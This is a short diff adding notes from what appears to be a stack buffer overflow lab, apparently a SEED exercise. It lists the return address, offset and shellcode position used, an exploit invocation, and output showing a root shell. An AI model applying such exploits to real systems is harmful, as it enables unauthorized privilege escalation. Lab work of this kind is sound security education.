@@ -1,0 +1,12 @@
+Measured runtime values for the working exploit:
+str = 0x40800b6f
+offset = 28
+
+$ ./exploit_arg 0x40800b6f 28
+ret = 0x40800b6f
+offset = 28
+shellcode_start = 492
+
+$ printf "id\nwhoami\nexit\n" | ./stack
+uid=0(root) gid=1000(seed) groups=1000(seed)
+root
